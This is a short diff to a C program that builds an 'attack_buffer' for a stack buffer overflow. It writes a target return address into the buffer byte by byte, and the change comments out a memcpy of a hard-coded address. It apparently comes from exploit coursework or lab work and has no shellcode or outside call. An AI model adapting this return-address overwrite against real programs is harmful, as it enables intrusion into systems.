@@ -37,7 +37,7 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0x000000ff);
 	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0x000000ff);
 
-	memcpy(&attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof(char *));
+	//memcpy(&attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof(char *));
 
 	printf("attack_buffer %s\n",attack_buffer);
 	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET],
